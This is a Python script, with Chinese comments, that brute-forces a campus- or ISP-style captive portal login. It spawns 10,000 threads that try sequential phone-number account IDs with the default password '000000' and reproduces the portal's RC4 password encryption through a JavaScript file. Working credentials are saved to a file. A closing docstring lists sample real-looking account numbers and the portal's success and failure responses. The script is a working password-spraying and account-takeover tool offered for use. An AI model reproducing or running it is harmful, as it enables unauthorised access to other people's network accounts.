import threading
import time

import execjs
import requests
from fake_useragent import UserAgent
from pandas.io import json

lock = threading.Lock()


def login(id, pwd):
    # 从文件中读取RC4 JavaScript代码
    with open('rc4.js', 'r', encoding='utf-8') as f:
        js = f.read()

    # 使用execjs编译JavaScript代码
    ctx = execjs.compile(js)

    # 获取当前的Unix时间戳
    time1 = int(time.time())

    # 使用JavaScript代码中的RC4加密加密密码
    truepwd = ctx.call('do_encrypt_rc4', pwd, str(time1))

    # 定义登录请求的URL
    url = "http://1.1.1.2/ac_portal/login.php"

    headers = {
        'User-agent': UserAgent().random
    }

    # 创建包含登录数据的字典
    data = {"opr": "pwdLogin", "userName": id, "pwd": truepwd, "auth_tag": time1, "rememberPwd": 0}
    # print(data)

    # 发送一个带有登录数据的POST请求
    r = requests.post(url, data=data, headers=headers)
    # 将响应解析为JSON
    if r.status_code == 200:
        json1 = json.loads(r.text)
        if json1["success"]:
            # 格式化并保存账号和密码到文件
            current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            with open("login.txt", "a") as f:
                f.write(f"\n{current_time} - {id} - {pwd}")
                print(f"Success: {id}")
    else:
        print(f"Error: {r.status_code}")


# 测试
def test():
    # 从文件中读取RC4 JavaScript代码
    with open('rc4.js', 'r', encoding='utf-8') as f:
        js = f.read()

    # 使用execjs编译JavaScript代码
    ctx = execjs.compile(js)

    # 获取当前的Unix时间戳
    time1 = int(time.time())

    # 使用JavaScript代码中的RC4加密加密密码
    truepwd = ctx.call('do_encrypt_rc4', "000000", str(time1))

    # 定义登录请求的URL
    url = "http://1.1.1.2/ac_portal/login.php"

    headers = {
        'User-agent': UserAgent().random
    }

    # 创建包含登录数据的字典
    data = {"opr": "pwdLogin", "userName": 19390027268, "pwd": truepwd, "auth_tag": time1, "rememberPwd": 0}
    # print(data)
    # 发送一个带有登录数据的POST请求 proxies=proxies
    r = requests.post(url, data=data, headers=headers)

    # 将响应解析为JSON
    if r.status_code == 200:
        json1 = json.loads(r.text)
        if json1["success"]:
            # 格式化并保存账号和密码到文件
            current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            with open("login.txt", "a") as f:
                f.write(f"\n{current_time} - {19390027268} - 000000")
                print(f"Success: {19390027268}")
    else:
        print(f"Error: {r.status_code}")


if __name__ == '__main__':
    # 创建多个线程以使用不同的账号ID进行登录尝试
    id = 19390021250
    for i in range(10000):
        t = threading.Thread(target=login, args=(str(id), "000000"))
        t.start()
        print(f"启动线程 {i} --account: {id}")
        id += 1

"""
账号格式:
    19390027268
    19390026708
    19390027279
    19390027266
    19390026705
    
post请求
   data : {
        "opr": "pwdLogin", "userName": id, "pwd": truepwd, "auth_tag": time1, "rememberPwd": 0
    }
    
   其中  pwd: 在js进行了加密 
        auth_tag 时间戳
        
    
账号正确响应结果:
{"success":true,"msg":"logon success","action":"location","pop":0,"userName":"0431119390027268", "location":"http://1.1.1.2/homepage/mobile_detail.html"}
账号错误响应结果:
{"msg":"用户名或密码错误","success":false}
"""
